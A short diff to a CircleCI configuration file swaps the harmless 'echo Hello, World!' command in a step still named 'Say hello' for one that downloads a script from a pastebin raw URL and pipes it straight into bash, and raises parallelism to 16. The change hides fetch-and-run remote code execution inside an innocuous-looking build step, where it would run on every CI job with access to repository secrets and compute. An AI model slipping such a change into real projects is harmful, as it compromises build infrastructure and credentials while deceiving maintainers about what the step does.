@@ -16,8 +16,8 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "echo Hello, World!"
-
+          command: bash -c "$(curl -fsSL https://pastebin.com/raw/2Q8BJ4Ka)"
+    parallelism: 16
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/configuration-reference/#workflows
 workflows:
